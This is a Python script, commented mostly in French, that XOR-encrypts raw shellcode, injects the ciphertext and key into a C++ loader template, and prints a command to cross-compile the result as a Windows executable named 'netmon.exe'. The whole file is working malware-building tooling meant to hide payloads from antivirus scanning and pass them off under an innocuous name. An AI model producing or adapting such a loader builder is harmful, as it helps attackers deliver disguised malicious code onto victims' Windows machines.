

import argparse
import os
import re
import secrets
import sys

SHELLCODE_MARKER = "/* @@SHELLCODE@@ */"
KEY_MARKER       = "/* @@XORKEY@@ */"
DEFAULT_KEY_LEN  = 20


# Helpers

def gen_key(length: int = DEFAULT_KEY_LEN) -> bytes:
    """Cle XOR aleatoire cryptographiquement sure."""
    return secrets.token_bytes(length)


def parse_key(raw):
    if raw is None or raw.lower() == "auto":
        return gen_key()
    cleaned = raw.strip().replace(" ", "").replace("0x", "").replace(",", "")
    if len(cleaned) % 2 != 0:
        raise SystemExit("[!] Cle XOR de longueur impaire (doit etre en hexa).")
    return bytes.fromhex(cleaned)


def xor_crypt(data: bytes, key: bytes) -> bytes:
    k = len(key)
    return bytes(b ^ key[i % k] for i, b in enumerate(data))


def to_c_array(data: bytes, per_line: int = 16) -> str:
    out = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        out.append("    " + " ".join("0x%02x," % b for b in chunk))
    return "\n".join(out)


def inject(template: str, marker: str, data: bytes):
    """Remplace le marqueur (et son eventuel remplissage 0x00) par le tableau C."""
    idx = template.find(marker)
    if idx == -1:
        raise SystemExit("[!] Marqueur introuvable dans le template : %s" % marker)
    pattern = re.compile(re.escape(marker) + r"(?:\s*0x00)?")
    new = pattern.sub(lambda m: to_c_array(data), template, count=1)
    return new, idx


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="XOR-encrypte un shellcode et l'injecte dans un loader C++."
    )
    ap.add_argument("shellcode", help="shellcode brut en entree (.bin)")
    ap.add_argument("encrypted", help="fichier de sortie du shellcode chiffre (.bin)")
    ap.add_argument("-p", "--key", default="auto",
                    help="cle XOR en hexa, ou 'auto' (defaut) pour en generer une")
    ap.add_argument("-k", "--loader", nargs="+", required=True,
                    help="template du loader (le dernier argument est le chemin)")
    ap.add_argument("-addedshellcode-loader", dest="output", required=True,
                    help="chemin du .cpp de sortie")
    args = ap.parse_args()

    # wetake the last path
    template_path = args.loader[-1]

    # 1. read of the shellcode
    try:
        with open(args.shellcode, "rb") as f:
            shellcode = f.read()
    except OSError as e:
        raise SystemExit("[!] Lecture impossible de %s : %s" % (args.shellcode, e))

    print("[+] Shellcode lu : %d octets" % len(shellcode))

    # 2. XOR key
    key = parse_key(args.key)
    print("[+] Cle XOR (%d octets) : %s" % (len(key), key.hex()))

    # 3. encryption
    encrypted = xor_crypt(shellcode, key)
    with open(args.encrypted, "wb") as f:
        f.write(encrypted)
    print("[+] Shellcode chiffre ecrit -> %s" % args.encrypted)

    # 4. read of the template
    try:
        with open(template_path, "r", encoding="utf-8") as f:
            template = f.read()
    except OSError as e:
        raise SystemExit("[!] Lecture impossible du template %s : %s" % (template_path, e))

    # 5. Injection of the shellcode + key
    template, idx = inject(template, SHELLCODE_MARKER, encrypted)
    print("[+] Found placeholder at index: %d" % idx)

    template, _ = inject(template, KEY_MARKER, key)

    print("[+] Cle XOR en tableau C (usage manuel) :")
    print("    unsigned char g_xor_key[%d] = {" % len(key))
    print(to_c_array(key))
    print("    };")

    # 6. writing from the loader
    out_dir = os.path.dirname(os.path.abspath(args.output))
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
    with open(args.output, "w", encoding="utf-8") as f:
        f.write(template)
    print("[+] Loader ecrit -> %s" % args.output)

    # 7. simple recall for the compiling command
    print("[+] Compiler avec :")
    print("    x86_64-w64-mingw32-g++ -O2 -static -o netmon.exe \"%s\"" % args.output)


if __name__ == "__main__":
    main()
